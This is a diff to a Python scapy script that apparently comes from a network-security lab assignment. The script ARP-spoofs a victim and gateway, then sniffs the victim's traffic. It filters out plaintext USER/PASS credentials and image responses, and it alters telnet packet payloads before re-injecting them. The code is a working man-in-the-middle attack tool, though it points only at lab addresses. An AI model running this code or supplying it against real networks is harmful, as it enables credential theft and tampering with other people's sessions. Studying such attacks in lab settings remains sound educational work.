@@ -1,7 +1,10 @@
 from multiprocessing import Process
 import scapy.all as scapy
+from scapy import pipetool
 from scapy.layers.http import HTTPRequest, HTTPResponse, TCP
-from scapy.utils import wrpcap
+from scapy.scapypipes import SniffSource
+from scapy.utils import wrpcap, PcapWriter
+from scapy.pipetool import *
 
 import os
 import sys
@@ -35,10 +38,12 @@ def get_mac(ip):
 
 
 class Arper:
-    def __init__(self, victim, destination, interface="eth0"):
+    def __init__(self, victim, destination, interface="eth0", option=1):
         self.victim_ip = victim
         self.gateway_ip = destination
         self.interface = interface
+
+        self.question_num = option
 
         self.victim_mac = get_mac(self.victim_ip)
         self.gateway_mac = get_mac(self.gateway_ip)
@@ -49,7 +54,6 @@ class Arper:
         self.tot_written = 0
         self.first100 = []
         self.gotfirst100 = False
-
 
         self.pkt_capture_count = 0
 
@@ -86,46 +90,42 @@ class Arper:
             # print(packet.summary())
             yield packet
 
-    def filterWrite(self, captured_packets):
-        print(f"captured {self.victim_ip} {self.pkt_capture_count}")
-        self.pkt_capture_count += 1
-
-
-        first_100, plaintest_passwd_user, img_responses, modified_telnet = filter(
-            capture_itr=captured_packets).processPackets(captured_packets)
-
-        all = [first_100, plaintest_passwd_user, img_responses, modified_telnet]
-        all_names = ["Task 2 - Step 1.pcap", "Task 2 - Step 2.pcap", "Task 2 - Step 3.pcap", "Task 2 - Step 4.pcap", ]
-
-        if self.tot_written >= 100 and self.gotfirst100 == False:
-            writePcap(all_names[0], self.first100[:99])
-            self.gotfirst100 = True
-        else:
-            self.first100.append(captured_packets)
-            self.tot_written += len(captured_packets)
-
-        for i in range(1, len(all)):
-            if len(all[i]) != 0:
-                writePcap(all_names[i], all[i])
-
-        #writePcap("all.pcap", captured_packets)
 
     def sniff(self, count=100):
         # this function performs the sniffing attack
-        victim_ip_filter = f"ip host {self.victim_ip}"
-        #gateway_ip_filter = f"ip gateway {self.gateway_ip}"
-        packet_gen = self.packet_sniff(victim_ip_filter, count=1)
 
-        #scapy.sniff(prn=lambda x: self.filterWrite([x]), filter=filter)
+        victim_ip_filter = f"ip host {self.victim_ip}"
+        packet_gen = self.packet_sniff(victim_ip_filter, count=10)
 
         i = 0
-        # for i in range(count):
         while i != count:
             pkt_batch = next(packet_gen)
             i += len(pkt_batch)
             self.filterWrite(pkt_batch)
 
             print(f"captured {self.victim_ip} {i}/{count}")
+
+    def filterWrite(self, captured_packets):
+        print(f"captured {self.victim_ip} {self.pkt_capture_count}")
+        self.pkt_capture_count += 1
+
+        resulting_pkts = filter(capture_itr=captured_packets, option=self.question_num).processPackets(captured_packets)
+
+        filename = f"Task 2 - Step {self.question_num}.pcap"
+
+        exists = os.path.isfile(filename)
+
+        if self.tot_written >= 100 and self.gotfirst100 == False and self.question_num == 1:
+            writePcap(filename, self.first100[:99])
+            self.gotfirst100 = True
+        else:
+            self.first100.append(captured_packets)
+            self.tot_written += len(captured_packets)
+
+        if len(resulting_pkts) != 0:
+            writePcap(filename, resulting_pkts)
+
+        # writePcap("all.pcap", captured_packets)
 
     def restore(self):
         victim_cure = scapy.ARP(op=2,
@@ -148,39 +148,46 @@ class Arper:
 
 
 class filter:
-    def __init__(self, capture_itr):
+    def __init__(self, capture_itr, option):
         self.capture_itr = capture_itr
+        self.option = option
         # self.packets = [pkt for pkt in capture_itr]
 
     def processPackets(self, pkt_itr):
-        first_100 = []
-        plaintest_passwd_user = []
-        img_responses = []
-        telnet_pkts = []
-        modified_telnet = []
+        filtered_pkts = []
+        pass_filter = False
 
         counter = 0
         for pkt in self.capture_itr:
-            if counter < 100:
-                first_100.append(pkt)
-            if self.longinPkt(pkt):
-                print("login captured")
-                plaintest_passwd_user.append(pkt)
-            if self.respImgPkt(pkt):
-                print("image captured")
-                img_responses.append(pkt)
-            if self.telnetPkt(pkt):
-                print("telnet captured")
-                telnet_pkts.append(pkt)
-                modified_pkt = self.modifyTCPDFData(pkt=pkt, repalceWith="R")
-                scapy.send(modified_pkt)
-                if modified_pkt is not None:
-                    modified_telnet.append(modified_pkt)
-
+            if self.option == 1:
+                if counter < 100:
+                    filtered_pkts.append(pkt)
+                    pass_filter = True
+            elif self.option == 2:
+                if self.longinPkt(pkt):
+                    print("login captured")
+                    filtered_pkts.append(pkt)
+                    pass_filter = True
+            elif self.option == 3:
+                if self.respImgPkt(pkt):
+                    print("image captured")
+                    filtered_pkts.append(pkt)
+                    pass_filter = True
+            elif self.option == 4:
+                if self.telnetPkt(pkt):
+                    print("telnet captured")
+                    # filtered_pkts.append(pkt)
+                    modified_pkt = self.modifyTCPDFData(pkt=pkt, repalceWith="R")
+                    pass_filter = True
+                    if modified_pkt is not None:
+                        filtered_pkts.append(modified_pkt)
+                        scapy.send(modified_pkt)
+                    else:
+                        filtered_pkts.append(pkt)
             counter += 1
 
         # telnet replacement here
-        return first_100, plaintest_passwd_user, img_responses, modified_telnet
+        return filtered_pkts
 
     def inRawDataFilter(self, pkt, filter):
         if filter in pkt:
@@ -202,9 +209,9 @@ class filter:
         :param extract:
         :return:
         """
-        username_search = ["USER"]
+        username_search = ["USER", "user"]
         # username_search.extend([w.upper() for w in username_search])
-        password_search = ["PASS"]
+        password_search = ["PASS", "pass"]
         # password_search.extend([w.upper() for w in password_search])
 
         usernames = []
@@ -335,12 +342,13 @@ class filter:
                 pass
 
 
-def arpSpoof():
+def arpSpoof(option=1):
     # (victim, destination, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
-    #(victim, destination, interface) = ("192.168.2.120", "192.168.2.1", "wlp59s0")
+    # (victim, destination, interface) = ("192.168.2.120", "192.168.2.1", "wlp59s0")
 
     (victim, destination, interface) = ("10.9.0.5", "10.9.0.6", "vetha75a8aa")
-    myarp = Arper(victim, destination, interface)
+
+    myarp = Arper(victim, destination, interface, option=1)
     myarp.run()
 
 
@@ -354,14 +362,18 @@ def questions():
     # pkt_iterator = iteratePcap("data/captures/example/wwb001-hackerwatch.pcapng")
     # pkt_iterator = iteratePcap("data/captures/example/http_witp_jpegs.cap")
     pkt_iterator = iteratePcap("data/captures/example/telnet.cap")
-    filterer = filter(capture_itr=pkt_iterator)
-    first_100, plaintest_passwd_user, img_responses, modified_telnet = filterer.processPackets(pkt_iterator)
-    all = [first_100, plaintest_passwd_user, img_responses, modified_telnet]
-    all_names = ["Task 2 - Step 1.pcap", "Task 2 - Step 2.pcap", "Task 2 - Step 3.pcap", "Task 2 - Step 4.pcap", ]
-    for i in range(len(all)):
-        writePcap(all_names[i], all[i])
+    filterer = filter(capture_itr=pkt_iterator, option=1)
+    filtered = filterer.processPackets(pkt_iterator)
+
+    for i in filtered:
+        writePcap("test_cap.pcap", i)
 
 
 if __name__ == '__main__':
-    arpSpoof()
+    """
+    please pick options:
+    1/2/3/4
+    depending on what question you are assessing!
+    """
+    arpSpoof(option=1)
     #questions()
